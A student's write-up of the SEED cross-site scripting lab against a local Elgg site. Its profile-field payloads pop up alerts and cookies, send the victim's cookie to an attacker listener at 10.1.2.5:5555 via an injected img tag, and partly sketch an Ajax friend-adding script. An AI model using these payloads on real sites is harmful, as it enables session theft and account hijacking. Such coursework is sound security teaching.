Niralee Kothari


Note:
There was a sudden crash at the last moment in SEEDUbuntu16.04 so I have used SEEDUbuntu20.04 for completeing all task and I have provided the screenshots about the error in the report. The first two tasks where performed on SEEDUbuntu16.04 I have attached the screenshot in the report.


This file describes the code that I used and how I executed that code to successfully complete the attacks.


First Of All start by turning on the Virtual Machine and then from the terminal we will connect to the DNS server using the following URL but before this, we have to download the Labelsetup.zip file.


DNS: http://www.xsslabelgg.com


After the successful connection, we will just enter the username and password (given in the shared document from the prof.) one by one and will log in to the accounts.


Now we have successfully created the basic requirements for implementing the tasks.


Task 1: : Posting a Malicious Message to Display an Alert Window


Step #1
Now we will first log in to the samy account and go to the profile section


Step#2
Now from there we will go to the edit profile and in the Brief Description section we will place the following command:


<script>alert(’XSS’);</script>


Step #3
Now we will just save the modifications and we will see the pop-up displaying the XXS text.
  

Task 2:  Posting a Malicious Message to Display Cookies


Step#1 
After successfully completing task one we will again go to the samy’s profile and remove the script that we added for the first one.


Step#2
Now after removing we will add another script over there for showing the cookie. And the script for it is 


<script>alert(document.cookie);</script>


Step #3
After adding just save the changes and we will see the result as a popup box showing the cookie.


Task 3: Stealing Cookies from the Victim’s Machine


Step#1
Now for this, we will first open the terminal and start the 5555 to connect nd provide the cookie of the victim's machine. The code for that is:
Nc -l 5555


Step #2
Now after that we will go in to samy profile and edit the profile and add the following lines of code:


<script>document.write(’<img src=http://10.1.2.5:5555?c=’
+ escape(document.cookie) + ’ >’);
</script>


Step #3
After saving the changes we will see the the GET Id even the Host Url and all other things will be seen as a result.



Task 4: : Becoming the Victim’s Friend


Step #1
Here first we will create one addfriend.js file in the labsetup folder and will paste the following code inside that:


<script type="text/javascript">
window.onload = function () {
var Ajax=null;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; ➀
var token="&__elgg_token="+elgg.security.token.__elgg_token; ➁ //Construct the HTTP request to add Samy as a friend. var sendurl=...; //FILL IN //Create and send Ajax request to add friend Ajax=new XMLHttpRequest(); Ajax.open("GET",sendurl,true); Ajax.setRequestHeader("Host","www.xsslabelgg.com"); Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); Ajax.send(); } 


Step #2
Here we will change and add the sendurl part which will be the url of the friend in our case it will be the url of samy.


Step #3
After changing the url we will go to the samy’s profile and add the above code in the description in HTML format.


Step#4
Then we will go to the Charlies profile and give the friend request to samy and in the live firefox we can see the requested url of the friends profile and the added friends profile, host address, cookie, etc.


Step #5
So when we log in to the Charlie account it shows that the samy is a friend.


I did not receive any help on this exam from any source (e.g. internet sites) other than the instructor, course textbook, class slides, class assignments, notes taken, and/or class videos. I did not help any other student with their exam.

Niralee Kothari